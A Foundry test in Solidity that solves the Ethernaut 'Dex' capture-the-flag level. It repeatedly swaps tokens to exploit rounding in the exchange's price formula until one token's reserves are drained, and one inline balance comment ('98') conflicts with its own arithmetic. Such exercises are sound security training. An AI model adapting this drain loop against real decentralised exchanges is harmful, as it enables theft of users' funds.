// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Dex/DexFactory.sol";
import "../src/Ethernaut.sol";

contract DexTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testDexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));
        SwappableToken swappableToken1 = SwappableToken(ethernautDex.token1());
        SwappableToken swappableToken2 = SwappableToken(ethernautDex.token2());

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        ethernautDex.approve(address(ethernautDex), type(uint256).max);
        ethernautDex.swap(ethernautDex.token1(), ethernautDex.token2(), 10);
        //swapAmount = (10 * 100) / 100 = 10
        console.log(ethernautDex.balanceOf(ethernautDex.token1(), address(ethernautDex))); // 110
        console.log(ethernautDex.balanceOf(ethernautDex.token2(), address(ethernautDex))); // 90
        ethernautDex.swap(ethernautDex.token2(), ethernautDex.token1(), 10);
        //swapAmount = (10 * 110) / 90 = 11.111111111111111111 (truncated to 11)
        console.log(ethernautDex.balanceOf(ethernautDex.token1(), address(ethernautDex))); // 98
        console.log(ethernautDex.balanceOf(ethernautDex.token2(), address(ethernautDex))); // 100

        address[2] memory tokens = [ethernautDex.token1(), ethernautDex.token2()];

        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;
        uint256 fromIndex = 0;
        uint256 toIndex = 1;
        while (true) {
            hackBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(address(this)),
                SwappableToken(tokens[toIndex]).balanceOf(address(this))
            ];

            dexBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(address(ethernautDex)),
                SwappableToken(tokens[toIndex]).balanceOf(address(ethernautDex))
            ];

            uint256 swapPrice = ethernautDex.getSwapPrice(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            if (swapPrice > dexBalances[1]) {
                ethernautDex.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                break;
            } else {
                ethernautDex.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            }
            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }
}
